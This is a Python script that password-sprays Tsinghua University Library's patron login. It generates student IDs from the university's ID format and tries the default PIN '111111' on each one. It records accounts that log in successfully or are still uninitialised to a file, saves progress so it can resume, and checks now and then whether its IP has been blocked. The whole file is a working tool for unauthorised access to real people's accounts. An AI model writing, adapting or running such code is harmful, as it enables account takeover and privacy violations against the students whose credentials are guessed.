# encoding=utf-8
import requests
import re
from random import randint
from time import sleep


# 清华大学学号规则xxxx(year)xx(code)xxxx(serial)
year_list = [2016, 2015, 2014, 2013, 2012]
code_list = [1, 21, 31, 22, 26, 27, 2, 3, 4, 11, 12, 13, 5, 6, 29, 36, 37, 8, 28, 38]


def try_password(data_user):

    marker_failure_str = \
        ur'抱歉, 您提交的信息无效, 请重试'
    marker_success_str = \
        ur'你在Tsinghua University Library'
    marker_unregistered_str = \
        ur'请输入新PIN'

    # try code and pin
    session = requests.Session()
    url = 'http://innopac.lib.tsinghua.edu.cn/patroninfo*chx?code=%s&pin=%s' % \
          (data_user['code'], data_user['pin'])
    r = session.get(url)

    # judge the status via searching marker string in response
    if len(re.findall(marker_failure_str, r.text)) != 0:
        print('Failure: 1')
        return 1
    elif len(re.findall(marker_success_str, r.text)) != 0:
        print('Sucess: 2')
        return 2
    elif len(re.findall(marker_unregistered_str, r.text)) != 0:
        print('Sucess(unregistered): 4')
        return 4
    else:
        print('Strange: 3')
        return 3


def form_data_user(username, password):
    data_user = {'code': username,
                 'pin': password}
    return data_user


def form_user_name(id_dict):
    return '%04d%02d%04d' % (id_dict['year'], id_dict['code'], id_dict['num'])


def find_next_studentid(id_dict):
    if id_dict is None:
        return read_start_point()
    if id_dict['num'] < 1000:
        id_dict['num'] += 1
    else:
        id_dict['num'] = 0
        id_dict['year_id'] += 1
        if id_dict['year_id'] < len(year_list):
            id_dict['year'] = year_list[id_dict['year_id']]
        else:
            id_dict['year_id'] = 0
            id_dict['code_id'] += 1
            if id_dict['code_id'] < len(code_list):
                id_dict['code'] = code_list[id_dict['code_id']]
            else:
                return None
    return id_dict


def read_start_point():
    try:
        f = open('start_point_code.txt', 'r')
        id_dict_out = {}
        id_dict_out['year_id'] = int(f.readline())
        id_dict_out['code_id'] = int(f.readline())
        id_dict_out['num'] = int(f.readline())
        id_dict_out['year'] = year_list[id_dict_out['year_id']]
        id_dict_out['code'] = code_list[id_dict_out['code_id']]
    except IOError:
        id_dict_out = {'year': year_list[0], 'code': code_list[0],
                       'num': 0, 'year_id': 0, 'code_id': 0}
    finally:
        if f:
            f.close()
    return id_dict_out


def save_start_point(id_dict):
    print('save_start_point')
    try:
        f = open('start_point_code.txt', 'w')
        f.write(str(id_dict['year_id']) + '\n')
        f.write(str(id_dict['code_id']) + '\n')
        f.write(str(id_dict['num']) + '\n')
    except IOError:
        print('IOError')
        sleep(5)
    finally:
        if f:
            f.close()

if __name__ == '__main__':
    id_dict = find_next_studentid(None)
    try:
        while id_dict is not None:
            if randint(1, 100) == 1:
                # This is the two account that I have to test whether my IP is blocked
                if randint(1, 2) == 1:
                    data_user = form_data_user('2016310000', '111111')
                else:
                    data_user = form_data_user('2016310000', '111111')
                flag = 0
            else:
                name = form_user_name(id_dict)
                data_user = form_data_user(name, '111111')
                flag = 1

            print('trying: username=%s password=%s ...' % (data_user['code'], data_user['pin']))
            tag = try_password(data_user)
            if (tag == 2) | (tag == 4):
                if flag == 1:
                    print('BINGO!!!!!!!!!!!!!!!')
                    sleep(5)
                    try:
                        f = open('key.txt', 'a')
                        if tag == 2:
                            # the passcode tried for the account is correct
                            f.write('code: %s pin: %s tag: %d \n' % (data_user['code'], data_user['pin'], tag))
                        elif tag == 4:
                            # the account hasn't been initialized, 
                            # any password can be set as the password of this account
                            f.write('code: %s tag: %d \n' % (data_user['code'], tag))
                    except IOError:
                        print('IOError')
                    finally:
                        if f:
                            f.close()
            id_dict = find_next_studentid(id_dict)
    except KeyboardInterrupt:
        save_start_point(id_dict)
